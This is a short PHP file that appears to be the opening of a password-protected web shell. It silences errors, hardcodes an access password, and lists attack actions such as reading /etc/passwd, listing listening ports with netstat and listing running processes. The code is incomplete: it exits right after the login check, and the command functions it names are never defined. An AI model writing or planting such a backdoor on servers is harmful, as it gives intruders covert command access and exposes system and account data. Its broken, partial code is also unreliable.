<?php
session_start();

error_reporting(0);
set_time_limit(9999999);

$auth=1;
$version = "1.0";

$functions = array('Clear Screen' => 'ClearScreen()',
'Clear History' => 'ClearHistory()',
'Can I function?' => "runcommand('canirun','GET')",
'Get server info' => "runcommand('showinfo','GET')",
'Read /etc/passwd' => "runcommand('etcpasswdfile','GET')",
'Open ports' => "runcommand('netstat -an | grep -i listen','GET')",
'Running processes' => "runcommand('ps -aux','GET')",
'Readme' => "runcommand('shellhelp','GET')"


);
$thisfile = basename(__FILE__);

$password='alqaeda';
$sess = __FILE__.$password;
if(isset($_POST['p4ssw0rD']))
{
	if($_POST['p4ssw0rD'] == $password)
	{
		$_SESSION[$sess] = $_POST['p4ssw0rD'];
	}
	else
	{
		die("Wrong password");
	}

}
exit;
?>